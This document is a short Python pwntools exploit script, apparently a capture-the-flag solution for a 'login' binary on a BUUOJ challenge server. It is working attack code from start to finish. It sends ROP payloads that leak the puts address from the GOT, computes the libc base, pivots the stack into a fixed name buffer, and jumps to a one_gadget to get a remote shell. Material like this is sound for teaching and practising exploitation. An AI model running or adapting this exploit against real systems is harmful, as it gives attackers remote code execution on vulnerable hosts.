from pwn import *

#p = process('./login')
p = remote('node4.buuoj.cn', 28217)
elf = ELF('login')

#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc.so.6')

ru = lambda s : p.recvuntil(s)
sl = lambda s : p.sendline(s)
sn = lambda s : p.send(s)
rv = lambda s : p.recv(s)
sla = lambda r, s : p.sendlineafter(r, s)
sa = lambda r, s : p.sendafter(r, s)

leave_ret = 0x40098e
pop_rdi_ret = 0x401ab3
login = 0x4018c7
name_addr = 0x602400
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
call_puts = 0x4018b5

#gdb.attach(p, 'b *0x401972')

payload = b'admin\0\0\0' + p64(pop_rdi_ret) + p64(puts_got) + p64(call_puts)
sa(b'>', payload)

payload = b'admin\0\0\0' + b'a' * 0x18 + p64(name_addr)
sa(b'>', payload)

libc_base = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00')) - libc.sym['puts']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))
system = libc_base + libc.sym['system']

one_gadgets = [0x45206, 0x4525a, 0xef9f4, 0xf0897]
one_gadgets_buu = [0x45226, 0x4527a, 0xf03a4, 0xf1247]
one = libc_base + one_gadgets_buu[1]

success('libc_base -> {}'.format(hex(libc_base)))

sa(b'>', b'admin\0\0\0' + b'a' * 0x10 + p64(one))

payload = b'admin\0\0\0' * 4 + p64(name_addr)
sa(b'>', payload)

p.interactive()